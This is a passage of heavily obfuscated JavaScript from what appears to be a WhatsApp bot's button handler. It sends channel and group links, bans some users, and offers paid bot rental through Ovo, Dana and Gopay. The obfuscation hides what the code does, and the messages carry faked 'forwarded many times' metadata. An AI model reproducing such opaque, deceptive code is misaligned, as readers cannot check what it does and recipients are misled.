_0x3ab3db={};_0x3ab3db[_0x1e23e4(-0x30f,0x63a,0x200,0x25d)]='owner',_0x3ab3db[_0x593f96(0x2a4,-0x25b,0x276,0x764)]=_0x2bfd24,_0x3ab3db[_0x593f96(0xb7e,0x926,0x750,0xce3)]=0x1,sendButLocation(from,_0x1e23e4(0xb7a,0x73e,0xabe,0xfb5)+_0x593f96(0xa76,0x618,0x790,0xe3c)+_0x1e23e4(0x970,0xbac,0x868,0x63c)+_0x1e23e4(0x8dc,0x62c,0x80d,0x3e6)+'m/c/zeeone'+_0x593f96(0xca0,0xb7f,0xdd0,0x102b),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x593f96(0x2b1,0x178,-0x23d,0x7c8)+ini_mark['split']('@')[-0xbe*0xd+-0x1df0+0x2796],sourbwbbz,[_0x47d597,_0x3ab3db],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x593f96(0x301,-0x6,0x36a,-0x35)+_0x593f96(0xa77,0x725,0x7ec,0xb97)){const AITelA='2|4|0|3|1'[_0x1e23e4(0x544,-0x3e2,0x133,0x1d2)]('|');let MOVnTd=0x1ce9+0x7e7*0x1+-0x24d0;while(!![]){switch(AITelA[MOVnTd++]){case'0':var imgUrl=imgList[Math[_0x1e23e4(0x339,0x607,0x290,-0x18d)](Math[_0x1e23e4(0x9e2,0x611,0x57d,0x1aa)]()*imgList[_0x1e23e4(0xce1,0x7e6,0x90a,0x48d)])];continue;case'1':const _0x2d99c2={};_0x2d99c2[_0x593f96(0x958,0x7b9,0xa56,0x792)]=''+ucapannya2,_0x2d99c2[_0x1e23e4(0x2e,-0xb8,0xde,-0x5)]=_0x1e23e4(0xac1,0xc70,0x9a8,0xcd0)+_0x1e23e4(0x2df,0x8f8,0x622,0x42e),_0x2d99c2[_0x593f96(0x8f0,0xd2f,0x766,0xc4f)+'e']=_0x1e23e4(0x45e,0x86c,0x3c4,0x279),_0x2d99c2[_0x593f96(0xbb2,0xaef,0xd48,0xb82)+'rl']=''+imgUrl,_0x2d99c2[_0x1e23e4(0x53e,0x1ee,0x26c,0x2d8)]='',_0x2d99c2[_0x593f96(0x2cf,0x722,0x651,0x3cf)]='https://yo'+_0x593f96(0xc6f,0x111c,0x766,0x82e)+'channel/UC'+'dzWwbApjky'+'ODby7_MoRY'+'lA';const _0x559348={};_0x559348[_0x1e23e4(0xf35,0x8eb,0xa6a,0x813)]=_0x593f96(0x7b2,0x3e2,0x4a6,0x8af),_0x559348[_0x593f96(0xa0e,0x9e5,0xd6f,0xd0a)+_0x593f96(0x7e6,0x472,0x3d0,0xa9d)]=0x3b9aca00,_0x559348[_0x1e23e4(0xcc3,0xe53,0xaaf,0xcb9)+'d']=!![],_0x559348[_0x1e23e4(0x2f4,-0x141,0x142,0x4c3)+_0x593f96(0x3c2,0x1b7,-0x13c,0x1ee)]=!![],_0x559348[_0x1e23e4(0x710,0x7f2,0x3d0,0x59e)+_0x1e23e4(-0x3f,-0x134,0xf6,-0x35f)]=_0x2d99c2;const _0x4d6079={};_0x4d6079[_0x1e23e4(-0x40c,-0x1fc,0xcf,0x1f3)+'id']=[ini_mark],alpha[_0x593f96(0x863,0x63e,0x627,0x934)+'e'](from,tqto,text,{'thumbnail':fs['readFileSy'+'nc'](_0x593f96(0xc94,0xfdf,0x1156,0xbc0)+thumbnail),'caption':_0x1e23e4(0x22d,0x3ee,0x5d4,0x9c8),'contextInfo':_0x559348,'quoted':ftoko,'contextInfo':_0x4d6079});continue;case'2':console[_0x593f96(0x76c,0x584,0x928,0x887)](color(time,_0x1e23e4(0x372,-0x158,0x17b,0x551)),color(_0x1e23e4(0x4e,0x8bd,0x3a9,0x691)+'ge\x20Big\x20Tha'+_0x593f96(0x797,0x754,0xb9b,0x9b8)));continue;case'3':tqto=_0x593f96(0xb68,0xde1,0x90e,0x7e7)+_0x1e23e4(0x72f,0x46c,0x44c,0x924)+_0x593f96(0x4aa,0x4f9,0x9ac,0x672)+_0x593f96(0xc63,0x94c,0x93a,0xb11)+_0x593f96(0x769,0x753,0x398,0x484)+_0x1e23e4(0x8c9,0xe7,0x479,0x82d)+ini_mark[_0x1e23e4(0x4cd,-0x233,0x133,0x77)]('@')[0x24a8+0x4+-0x2*0x1256];continue;case'4':var imgList=['https://f.'+_0x593f96(0x9e0,0xd1d,0x74d,0xb86)+_0x593f96(0x6a0,0xaca,0x574,0x90a)+_0x593f96(0xcba,0xe3e,0x11b2,0x116d),_0x593f96(0x444,0x8f4,0x664,0x873)+_0x593f96(0x9e0,0xc86,0xe3f,0x93e)+'/p_2032mwb'+_0x1e23e4(0xd79,0x706,0x8f5,0xe06),_0x1e23e4(0x97b,0x53d,0x948,0x876)+_0x593f96(0x9e0,0x887,0xe72,0x619)+'/p_2032cf1'+'3z1.jpg','https://f.'+_0x593f96(0x9e0,0x517,0xb6c,0xb07)+'/p_2032xlj'+_0x593f96(0x3ac,0xa,-0xd9,0x85),'https://e.'+_0x1e23e4(0x42c,0xb8e,0x802,0x343)+_0x1e23e4(-0x34,-0x29d,0x14c,0x317)+_0x593f96(0xc81,0xb78,0xe73,0xb3d),'https://d.'+'top4top.io'+_0x1e23e4(0x571,0xc0a,0x983,0x798)+_0x1e23e4(0x793,0x593,0xa16,0x8e8),_0x1e23e4(0xa5,0x4ae,0x2dd,-0xba)+_0x593f96(0x9e0,0xad2,0x873,0x932)+_0x1e23e4(0x528,0x59b,0x935,0x7a7)+_0x593f96(0xb22,0x972,0x824,0xcdc)];continue;}break;}}if(sub_yt_zeeone_ofc=='Group\x20What'+_0x593f96(0xa86,0x6ad,0xb96,0xc6e)){console[_0x593f96(0x76c,0xbe1,0x5fd,0x663)](color(time,_0x1e23e4(-0x268,0x36a,0x17b,0xeb)),color(_0x1e23e4(0x312,0x41e,0x3a9,0x5f)+_0x593f96(0x510,0xaf,0x3aa,0x5ea)+_0x593f96(0xaec,0x8c3,0xc42,0x5d2))),tqto=_0x593f96(0x87f,0xd34,0x6fd,0xd3a)+sender[_0x593f96(0x311,-0xe7,-0x1d5,0x285)]('@')[0x12*0x135+-0x71*0x46+0x92c*0x1]+_0x593f96(0xb50,0xad3,0x6ed,0xfc2)+gc_wa_lu+(_0x593f96(0x49d,0x500,0xf6,0x977)+'\x20by\x20@')+ini_mark[_0x1e23e4(-0x33,0x445,0x133,0x519)]('@')[0x2d*-0x8c+-0xc57+0x24f3];const _0x2251ad={};_0x2251ad[_0x1e23e4(-0x79,-0x11c,0xcf,-0x26c)+'id']=[ini_mark,sender],alpha[_0x593f96(0x863,0xce6,0xc98,0x701)+'e'](from,tqto,text,{'thumbnail':fs[_0x1e23e4(0x738,0x531,0x581,0x24a)+'nc'](_0x593f96(0xc94,0xa61,0xc3c,0x100e)+thumbnail),'caption':_0x1e23e4(0x369,0x90f,0x5d4,0x1a6),'contextInfo':{'text':_0x593f96(0x7b2,0xb2e,0xa30,0xc88),'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'externalAdReply':{'title':''+ucapannya2,'body':''+baper,'previewType':'PHOTO','thumbnailUrl':'','thumbnail':fs['readFileSy'+'nc'](_0x1e23e4(0x9c3,0xe48,0xab6,0xe1e)+thumbnail),'sourceUrl':_0x1e23e4(0x4cf,0x9a0,0x9be,0xc24)+_0x1e23e4(0x79b,0x59b,0xa91,0xc1f)+_0x1e23e4(0xcac,0x6d6,0x8c0,0x7aa)+_0x593f96(0x6f1,0x983,0xb02,0x240)+'ODby7_MoRY'+'lA'}},'quoted':ftoko,'contextInfo':_0x2251ad});}if(sub_yt_zeeone_ofc==_0x1e23e4(0xbf9,0xed1,0xa26,0xaa6)+_0x1e23e4(0xd91,0xd7c,0xa24,0x6ac)){console[_0x1e23e4(0x254,0x6e6,0x58e,0x342)](color(time,_0x593f96(0x359,0x56b,-0x108,0x470)),color(_0x1e23e4(0x81c,0x11e,0x3a9,0x9b)+_0x593f96(0x853,0x5fa,0xb76,0x786)+_0x593f96(0x4f1,0x7e1,0x651,0x461)));const _0x477030={};_0x477030[_0x1e23e4(0x3e0,0x88e,0x7b3,0x7a2)]=mek,alpha[_0x1e23e4(0x416,0x55f,0x685,0x64a)+'e'](from,_0x593f96(0x647,0x996,0x1b9,0x12f)+'\x20'+pushname+enter+('https://ch'+'at.whatsap'+_0x593f96(0x338,0x67c,0x316,0x5b2)+_0x593f96(0x74c,0x9b2,0x6b8,0x2e9)+_0x593f96(0x719,0x6e7,0x6ca,0x306)),text,_0x477030);}if(sub_yt_zeeone_ofc==_0x1e23e4(0x84a,0xdd5,0xa26,0xe5b)+_0x1e23e4(0x45c,0x957,0x6cd,0x9ed)){console['log'](color(time,_0x593f96(0x359,0x579,0x268,0x273)),color(_0x593f96(0x587,0x650,0x33c,0x51a)+_0x593f96(0x853,0xada,0x9df,0x3b2)+_0x1e23e4(-0x1c1,0x56b,0xf2,-0xb5)+'2'));const _0x1f7c82={};_0x1f7c82[_0x593f96(0x991,0xd21,0x735,0xbd9)]=mek,alpha[_0x593f96(0x863,0x361,0x6c7,0x3e6)+'e'](from,'Ramein\x20kak'+'\x20'+pushname+enter+(_0x1e23e4(0x8e7,0x70f,0x8d8,0x59d)+_0x593f96(0x8fe,0x7f2,0x515,0xbf1)+_0x1e23e4(0x85f,0x527,0x6f9,0x933)+_0x593f96(0x6b3,0x767,0x6bc,0x9b7)+_0x1e23e4(0x39b,0x156,0x2d0,0x3c8)),text,_0x1f7c82);}if(subscribezeeoneofc=='sewa_kak'){console[_0x593f96(0x76c,0xb4c,0x4b0,0xa32)](_0x593f96(0x567,0x56,0x624,0x218)+'1;37m>',_0x1e23e4(0x406,0x502,0x896,0x40b)+_0x593f96(0x834,0x814,0x5e3,0x98d)+']',wib,color(_0x1e23e4(-0xa0,0x2d0,0x103,-0x371)+_0x593f96(0xc1a,0xee9,0x83a,0x917)+_0x593f96(0x793,0x8a4,0xa14,0xa25)));var ini_gopayyy=_0x1e23e4(0x682,0x67e,0x9e0,0xbd9)+sender[_0x1e23e4(0x1d1,-0x2e2,0x133,0x400)]('@')[-0x172f+0x26a8+0x1*-0xf79]+(_0x1e23e4(-0x3e8,0x1f8,0xf5,0x27a)+_0x1e23e4(0x29c,0x495,0x579,0x934)+'bot?🤔\x20Boon'+_0x593f96(0x832,0x48e,0x7ae,0x4c7)+'ned\x20>.<');const _0x362a9c={};_0x362a9c[_0x1e23e4(-0x196,-0xb9,0x1de,0x567)+'t']=_0x1e23e4(0x209,0x66d,0x21c,0x97);const _0x9b1a1a={};_0x9b1a1a[_0x593f96(0x3de,0x81a,0x83e,0x848)]=_0x1e23e4(-0x152,0x194,0x106,0x15e),_0x9b1a1a['buttonText']=_0x362a9c,_0x9b1a1a['type']=0x1;const _0x2321c4={};_0x2321c4[_0x1e23e4(-0x316,0x2c,0x1de,-0x16f)+'t']=_0x1e23e4(0x11c,0x6ce,0x4d8,0x48a);const _0x597e2f={};_0x597e2f['buttonId']=_0x1e23e4(0x1f2,0x7e3,0x4bc,0x717),_0x597e2f[_0x593f96(0x2a4,0x4e2,-0x1df,0x431)]=_0x2321c4,_0x597e2f['type']=0x1;var buttonsss=[_0x9b1a1a,_0x597e2f];const _0x44e1ed={};_0x44e1ed['contentTex'+'t']=ini_gopayyy,_0x44e1ed[_0x593f96(0x5b0,0x68e,0x784,0x438)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x44e1ed[_0x1e23e4(0xdfe,0xb62,0x8ef,0xbba)]=buttonsss,_0x44e1ed[_0x593f96(0x978,0x6da,0xc4b,0x89d)]=0x1,buttonMessageee=_0x44e1ed;const _0x2cbfa7={};_0x2cbfa7[_0x1e23e4(0xf40,0xb37,0xa6a,0x682)]='hi',_0x2cbfa7[_0x1e23e4(0x3ae,0x458,0x830,0x9f6)+'Score']=0x3b9aca00,_0x2cbfa7[_0x1e23e4(0xb0d,0x66f,0xaaf,0xdc5)+'d']=!![],_0x2cbfa7[_0x593f96(0x320,0x801,0x82e,0x42c)+_0x593f96(0x3c2,0x3ea,0x279,0x750)]=!![],_0x2cbfa7[_0x1e23e4(-0x3e9,0x350,0xcf,0x271)+'id']=[sender];const _0x537871={};_0x537871[_0x593f96(0x5da,0x66b,0x622,0x288)]='Botwea\x20©2k'+'21',_0x537871['contextInf'+'o']=_0x2cbfa7,_0x537871[_0x1e23e4(0xbce,0x3f4,0x7b3,0x722)]=mek,_0x537871[_0x593f96(0x320,0x79b,0x248,0x33e)+'ral']=!![],alpha[_0x1e23e4(0x8f9,0xa8c,0x685,0x4af)+'e'](from,buttonMessageee,MessageType[_0x1e23e4(0x677,0x68c,0x30b,0x46c)+_0x1e23e4(0xcd5,0x90b,0xa7d,0xc22)],_0x537871);}subscribezeeoneofc==_0x593f96(0x69a,0xa64,0x4de,0x276)&&(console[_0x593f96(0x76c,0x480,0x315,0xbd3)](_0x1e23e4(-0x69,0x18e,0x389,0x226)+_0x593f96(0x42d,0x51d,0x4ab,0xf5),_0x1e23e4(0x749,0xb17,0x896,0x5b0)+_0x1e23e4(0xa7a,0x8f8,0x656,0x8be)+']',wib,color(_0x593f96(0x2e1,0x5d2,-0x40,0x50a)+_0x1e23e4(0x302,0x641,0x691,0x5a3))),reply('Hmm,\x20banne'+'d\x20aja\x20nih\x20'+_0x593f96(0x645,0x728,0x38d,0xa17)+_0x593f96(0x8fd,0x93b,0x9b3,0x729)),bnnpd=sender[_0x1e23e4(0x55b,0x215,0x240,-0x23d)]('@','')+(_0x593f96(0x8c8,0xb69,0x561,0x465)+_0x1e23e4(0x693,0x511,0x8c4,0x9cb)),banned[_0x1e23e4(0x62a,0x93f,0x55f,0x80e)](bnnpd));if(subscribezeeoneofc==_0x593f96(0x2e4,0xf1,0x178,0x26c)){const mediaxpxa=await alpha['prepareMes'+_0x593f96(0xc5b,0xcd8,0xccb,0x10fd)](from,pp_bot,MessageType[_0x1e23e4(0x762,0x656,0x4c1,0x18b)],{'thumbnail':pp_bot});mhan=mediaxpxa[_0x593f96(0xb85,0xfb4,0x77d,0x75f)][_0x593f96(0xbdf,0xb72,0xfac,0x1067)+_0x1e23e4(0xb2f,0xa78,0x941,0x767)]?mediaxpxa[_0x593f96(0xb85,0x70b,0xc69,0xb3d)]['ephemeralM'+'essage']:mediaxpxa;const _0x341841={};_0x341841[_0x593f96(0x3bc,0x3e,0x74d,0x7fc)+'t']=_0x1e23e4(0x22f,-0x288,0x1b9,-0xf6);const _0x57d87c={};_0x57d87c[_0x593f96(0x3de,0x735,-0xc,0x437)]=_0x1e23e4(0x194,0x607,0x327,0x63f),_0x57d87c['buttonText']=_0x341841,_0x57d87c[_0x1e23e4(0x886,0x57e,0x9a0,0xd22)]=0x1;const buttons5=[_0x57d87c],btn5={'locationMessage':mhan[_0x1e23e4(0xa4b,0xaed,0x9a7,0x864)]['locationMe'+_0x593f96(0x302,0x157,0xb1,-0x1cf)],'contentText':pc_sewa(_minggu,__minggu,___minggu,_bulan,_permanen,__permanen),'footerText':_0x593f96(0xb97,0xce9,0x755,0xbf9)+_0x1e23e4(0x4c0,0x268,0x42b,-0xee)+_0x1e23e4(0xb0d,0x6b6,0x8fb,0xa43)+_0x593f96(0x352,0x37d,0x757,0x1cb)+enter+enter+botname+_0x1e23e4(0x6ac,0x874,0x936,0xc76)+ownername,'buttons':buttons5,'headerType':0x6};alpha['sendMessag'+'e'](from,btn5,MessageType[_0x1e23e4(0x74f,0x2cb,0x30b,0x754)+_0x593f96(0xc5b,0xc51,0xd0e,0xf6f)],{});}if(subscribezeeoneofc==_0x1e23e4(0xce,0x4c2,0x327,-0x14)){console['log'](_0x593f96(0x567,0xa1e,0x65c,0x583)+_0x1e23e4(0x3,0x5c7,0x24f,0x639),_0x593f96(0xa74,0xc09,0xe17,0xbb6)+_0x1e23e4(0x6bd,0x84b,0x656,0x8aa)+']',wib,color(_0x593f96(0x8fc,0x871,0x945,0xdcf)+_0x593f96(0xc51,0xbb0,0x89a,0xfdd)));var sewa_1=_0x593f96(0x636,0xa04,0x287,0x3e0)+sender['split']('@')[0x1ccc+-0xe5d+-0xe6f]+('\x20nah\x20sekar'+_0x593f96(0x3fb,0x1cb,-0xbb,0x664)+_0x1e23e4(0xa2b,0xedc,0xad3,0x5fe)+_0x593f96(0x779,0xac5,0x5ae,0x8c7)+_0x593f96(0x2fa,0x3e4,0x760,0x3d9)+'ang\x20tersed'+_0x1e23e4(0xbd1,0x516,0x9ad,0x58d)+_0x1e23e4(-0x352,-0x311,0x137,0x490)+_0x593f96(0x888,0x5a8,0xbd7,0x3c3)+_0x593f96(0x4d4,0x5e4,0x77,0x7f9)+_0x1e23e4(0x8f2,0x87f,0x89e,0x49a)+_0x1e23e4(0x734,0x7e7,0x3cc,0x2d7)+'ubungi\x20own'+'erbot\x20◠‿◕');const _0x1192da={};_0x1192da[_0x1e23e4(0x3d6,-0x249,0x1de,-0x1fd)+'t']='💷\x20Ovo';const _0x275d3b={};_0x275d3b[_0x1e23e4(0x6d,0x4e6,0x200,0x1aa)]=_0x593f96(0x4e4,0x944,0x523,0x70d),_0x275d3b[_0x1e23e4(-0x64,0x30c,0xc6,-0x2bf)]=_0x1192da,_0x275d3b[_0x593f96(0xb7e,0xa1f,0xc85,0x681)]=0x1;const _0x5f2844={};_0x5f2844['displayTex'+'t']='💶\x20Dana';const _0x1da796={};_0x1da796[_0x1e23e4(-0x1c3,0x16d,0x200,0x344)]=_0x1e23e4(0x5db,0x6e9,0x797,0xabe)+'1',_0x1da796[_0x1e23e4(0x53,0x446,0xc6,-0x317)]=_0x5f2844,_0x1da796['type']=0x1;const _0x36910e={};_0x36910e[_0x593f96(0x3bc,0x341,0x5e7,0x589)+'t']='💵\x20Gopay';const _0x19051c={};_0x19051c[_0x1e23e4(0x691,0x5bd,0x200,0x5fe)]=_0x593f96(0x9f8,0x70e,0x9b0,0xc5d)+'y1',_0x19051c[_0x1e23e4(0x100,0x1f6,0xc6,0x5ca)]=_0x36910e,_0x19051c[_0x593f96(0xb7e,0xd94,0xfc8,0xfc6)]=0x1;const buttons4=[_0x275d3b,_0x1da796,_0x19051c],_0xa41a2d={};_0xa41a2d[_0x593f96(0x4b5,0xcb,0x7b4,0x85f)+'t']=sewa_1,_0xa41a2d[_0x1e23e4(0x809,0x73f,0x3d2,0x2ff)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0xa41a2d['buttons']=buttons4,_0xa41a2d[_0x1e23e4(0x692,0x3dc,0x79a,0xc71)]=0x1;const btn4=_0xa41a2d,_0x51825d={};_0x51825d[_0x1e23e4(0x7c8,0xd39,0xa6a,0x8a6)]='hi',_0x51825d[_0x1e23e4(0x875,0x3f4,0x830,0x864)+_0x1e23e4(0x909,0x475,0x608,0xa2c)]=0x3b9aca00,_0x51825d[_0x593f96(0xc8d,0x821,0x7f7,0xd37)+'d']=!![],_0x51825d['sendEpheme'+_0x593f96(0x3c2,-0xe0,0xf3,0x79f)]=!![],_0x51825d[_0x593f96(0x2ad,-0x1f0,0x8b,0x74a)+'id']=[sender];const _0x50978e={};_0x50978e[_0x593f96(0x5da,0x2fb,0x114,0x6e7)]='Botwea\x20©2k'+'21',_0x50978e['contextInf'+'o']=_0x51825d,_0x50978e['quoted']=fkontak,_0x50978e[_0x593f96(0x320,0x430,0x1c8,-0x34)+_0x1e23e4(-0x5d,-0x200,0x1e4,-0x1a1)]=!![],alpha[_0x593f96(0x863,0x754,0x414,0xb07)+'e'](from,btn4,MessageType[_0x593f96(0x4e9,0x441,0x77f,0x765)+_0x593f96(0xc5b,0xac6,0xa1c,0x90f)],_0x50978e);}if(subscribezeeoneofc==_0x593f96(0x4e4,0x54f,0x13,0x380)){console[_0x1e23e4(0x419,0x214,0x58e,0x580)](_0x1e23e4(0xe2,0x4be,0x389,0x13d)+_0x593f96(0x42d,0x1e4,0x64e,0x355),_0x1e23e4(0xbb0,0x3aa,0x896,0x440)+_0x1e23e4(0x6c2,0x6be,0x656,0x660)+']',wib,color(_0x1e23e4(0x3c1,-0x107,0x103,0x528)+_0x1e23e4(0xa3b,0xc57,0x95c,0xbe2)+_0x1e23e4(0xb7d,0x5f1,0x6a7,0xa59)));var ini_info=_0x593f96(0xcd3,0xf56,0x9db,0x10d7)+sender[_0x1e23e4(0x2e5,0x13b,0x133,-0x32)]('@')[0x18b6+-0x5c5+-0x12f1]+(_0x1e23e4(0xad1,0x878,0x754,0x46a)+_0x593f96(0x64d,0x9a9,0x16c,0x47a)+_0x593f96(0x6c4,0x87e,0x33c,0x5aa)+_0x593f96(0x680,0x531,0x760,0x57a)+_0x1e23e4(0x5e5,0x62e,0x405,0x664));const _0x3c1a64={};_0x3c1a64[_0x1e23e4(-0x330,-0x48,0x1de,0x56a)+'t']=_0x1e23e4(0x52,0x3c5,0x25c,0x4eb);const _0xbcc164={};_0xbcc164['buttonId']=_0x593f96(0x791,0xa6a,0x82c,0x5d3)+'vo13',_0xbcc164[_0x1e23e4(0x1f,0x570,0xc6,-0x3e4)]=_0x3c1a64,_0xbcc164[_0x593f96(0xb7e,0x9f6,0xa49,0x8e3)]=0x1;const _0x92354f={};_0x92354f[_0x1e23e4(0x2ab,0x337,0x1de,0x287)+'t']=_0x593f96(0xc28,0x1050,0xc48,0xb3b);const _0x125689={};_0x125689[_0x593f96(0x3de,0x24d,0x395,0x39f)]='qr_ovo13',_0x125689[_0x593f96(0x2a4,-0x4c,-0x23b,0x552)]=_0x92354f,_0x125689[_0x593f96(0xb7e,0x670,0xff9,0xef9)]=0x1;const buttons6=[_0xbcc164,_0x125689],_0x29aa9b={};_0x29aa9b[_0x593f96(0x4b5,0x635,0x438,0x4ca)+'t']=ini_info,_0x29aa9b[_0x1e23e4(0x1ad,-0xa4,0x3d2,0x434)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x29aa9b[_0x593f96(0xacd,0xe2c,0xec4,0xb7d)]=buttons6,_0x29aa9b[_0x593f96(0x978,0xcfd,0xd94,0xd2a)]=0x1;const btn6=_0x29aa9b,_0x222e8d={};_0x222e8d[_0x1e23e4(0x76c,0xc4d,0xa6a,0xd75)]='hi',_0x222e8d[_0x593f96(0xa0e,0x872,0x713,0x7c0)+'Score']=0x3b9aca00,_0x222e8d['isForwarde'+'d']=!![],_0x222e8d[_0x1e23e4(0x15a,-0x2a1,0x142,-0x259)+_0x593f96(0x3c2,0x3e1,0x643,-0x8c)]=!![],_0x222e8d[_0x1e23e4(0x5d8,-0x178,0xcf,0x350)+'id']=[sender];const _0x52a43a={};_0x52a43a[_0x1e23e4(0x7d2,0x8e2,0x3fc,0x7b3)]=_0x1e23e4(-0x106,0x3e7,0x31f,0x451)+'21',_0x52a43a['contextInf'+'o']=_0x222e8d,_0x52a43a['quoted']=fkontak,_0x52a43a[_0x593f96(0x320,0x4ee,0x7e7,0x2af)+_0x593f96(0x3c2,-0x132,0x383,0x691)]=!![],alpha[_0x593f96(0x863,0xc19,0x51d,0xb6b)+'e'](from,btn6,MessageType[_0x1e23e4(-0x2,0xf2,0x30b,0x4dd)+_0x1e23e4(0xd57,0xaa2,0xa7d,0x5e2)],_0x52a43a);}if(subscribezeeoneofc=='bayar_dana'+'1'){console['log'](_0x1e23e4(-0x1,0x718,0x389,0x5d4)+_0x1e23e4(0x68b,0x5e,0x24f,0x4f3),'[\x1b[1;32m\x20C'+_0x1e23e4(0x3b9,0x506,0x656,0x59d)+']',wib,color(_0x593f96(0x2e1,0x2fc,0x20c,-0x1ed)+'sage\x20Payme'+_0x1e23e4(-0x189,0x2f9,0x1fd,0x157)));var ini_info=_0x593f96(0xcd3,0xb5b,0x11c8,0xee2)+sender['split']('@')[0x9a+0x1930+-0x1*0x19ca]+(_0x593f96(0x932,0x67f,0x81d,0x997)+_0x593f96(0x64d,0x675,0x43a,0x2f1)+_0x593f96(0x6c4,0x6df,0x82c,0x39a)+_0x1e23e4(0x41b,0x22e,0x4a2,0x756)+_0x593f96(0x5e3,0x844,0xa95,0x9e9));const _0xc81fc4={};_0xc81fc4[_0x593f96(0x3bc,0x3ac,0x6de,0x77f)+'t']=_0x593f96(0x43a,0x67d,0x4d8,0x20f);const _0x2a4ef5={};_0x2a4ef5[_0x1e23e4(-0x20a,-0x1c7,0x200,-0x310)]=_0x593f96(0x6bb,0xa36,0x307,0x74e)+_0x593f96(0xbfe,0x9ec,0xfaf,0x835),_0x2a4ef5[_0x1e23e4(0x49b,-0xef,0xc6,-0x19c)]=_0xc81fc4,_0x2a4ef5['type']=0x1;const _0x541dc6={};_0x541dc6[_0x1e23e4(-0x1ba,-0x13e,0x1de,-0xa7)+'t']=_0x1e23e4(0xbef,0xd4c,0xa4a,0xf14);const _0x3a9a19={};_0x3a9a19[_0x1e23e4(0x66f,-0x245,0x200,-0x317)]=_0x1e23e4(0xd6e,0x46c,0x96b,0x756),_0x3a9a19[_0x593f96(0x2a4,0x55c,0x4ef,0x6d5)]=_0x541dc6,_0x3a9a19[_0x1e23e4(0x533,0xe38,0x9a0,0xc62)]=0x1;const buttons6=[_0x2a4ef5,_0x3a9a19],_0x3897a2={};_0x3897a2[_0x1e23e4(-0x139,-0x12f,0x2d7,0x3de)+'t']=ini_info,_0x3897a2[_0x1e23e4(0x2e4,0x738,0x3d2,0x2a5)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x3897a2[_0x593f96(0xacd,0xc00,0x5c6,0x652)]=buttons6,_0x3897a2['headerType']=0x1;const btn6=_0x3897a2,_0x3c6e12={};_0x3c6e12[_0x1e23e4(0x7d3,0x6ca,0xa6a,0xa0e)]='hi',_0x3c6e12[_0x1e23e4(0x40c,0xc05,0x830,0x5c9)+_0x593f96(0x7e6,0x943,0x2f0,0xb97)]=0x3b9aca00,_0x3c6e12[_0x593f96(0xc8d,0x9b7,0x883,0xa4e)+'d']=!![],_0x3c6e12[_0x1e23e4(-0x1db,0x12,0x142,0x589)+_0x1e23e4(0x6b2,0x2c5,0x1e4,-0x279)]=!![],_0x3c6e12[_0x593f96(0x2ad,0x701,0x77c,-0x5c)+'id']=[sender];const _0x22212c={};_0x22212c[_0x1e23e4(0x579,-0xee,0x3fc,0x660)]=_0x1e23e4(-0x66,-0xaa,0x31f,0x77e)+'21',_0x22212c['contextInf'+'o']=_0x3c6e12,_0x22212c[_0x1e23e4(0x95f,0x459,0x7b3,0x61c)]=fkontak,_0x22212c['sendEpheme'+_0x593f96(0x3c2,0xa2,0x89a,0x8b6)]=!![],alpha[_0x1e23e4(0x172,0x642,0x685,0x171)+'e'](from,btn6,MessageType[_0x593f96(0x4e9,0x398,0x591,0x686)+'sage'],_0x22212c);}if(subscribezeeoneofc=='bayar_gopa'+'y1'){console[_0x1e23e4(0xf7,0x194,0x58e,0x1bc)](_0x593f96(0x567,0x249,0xb4,0x58a)+_0x593f96(0x42d,0x84b,0x7db,0x19b),_0x1e23e4(0x4e2,0xbc1,0x896,0xbe6)+_0x1e23e4(0x74c,0xb36,0x656,0x987)+']',wib,color('Button\x20Mes'+_0x1e23e4(0xa38,0xd12,0x95c,0x78e)+_0x593f96(0xcbc,0xfbf,0x1156,0xce0)));var ini_info=_0x1e23e4(0xd2b,0xb41,0xaf5,0x5fb)+sender[_0x1e23e4(0x42d,0x3dd,0x133,-0x1e6)]('@')[-0xc*0x10d+-0x527+-0x11c3*-0x1]+(',\x20kamu\x20mau'+_0x1e23e4(0x820,0x57f,0x46f,0x21)+'e\x20nomor\x20aj'+_0x1e23e4(0x468,0x761,0x4a2,0x20b)+_0x593f96(0x5e3,0x9b9,0xa51,0xa7c));const _0x38e540={};_0x38e540['displayTex'+'t']=_0x1e23e4(0x213,-0xe7,0x25c,0x567);const _0x3e46ba={};_0x3e46ba[_0x1e23e4(0x6cf,-0x39,0x200,0x6d4)]='langsung_g'+_0x1e23e4(0x605,0x160,0x104,-0x2c),_0x3e46ba[_0x1e23e4(-0x356,0x59c,0xc6,-0x3f5)]=_0x38e540,_0x3e46ba['type']=0x1;const _0x27b735={};_0x27b735[_0x593f96(0x3bc,0x60f,0x55e,0x675)+'t']='📠\x20Qr\x20Code';const _0x40dbb5={};_0x40dbb5[_0x593f96(0x3de,0x5b,0x2d1,-0x2)]=_0x1e23e4(0x8f2,0xb44,0x765,0x3a5),_0x40dbb5[_0x1e23e4(0x395,0x47e,0xc6,-0x142)]=_0x27b735,_0x40dbb5[_0x593f96(0xb7e,0xa68,0x7af,0xac5)]=0x1;const buttons6=[_0x3e46ba,_0x40dbb5],_0x1208c9={};_0x1208c9['contentTex'+'t']=ini_info,_0x1208c9['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x1208c9[_0x593f96(0xacd,0xe93,0x744,0x8f0)]=buttons6,_0x1208c9[_0x1e23e4(0x342,0xc12,0x79a,0x956)]=0x1;const btn6=_0x1208c9,_0x481aa6={};_0x481aa6['text']='hi',_0x481aa6[_0x1e23e4(0xb60,0x853,0x830,0xbce)+_0x593f96(0x7e6,0x515,0x367,0x767)]=0x3b9aca00,_0x481aa6[_0x1e23e4(0x67f,0x7d0,0xaaf,0x619)+'d']=!![],_0x481aa6[_0x1e23e4(0x274,0xc,0x142,0x71)+'ral']=!![],_0x481aa6['mentionedJ'+'id']=[sender];const 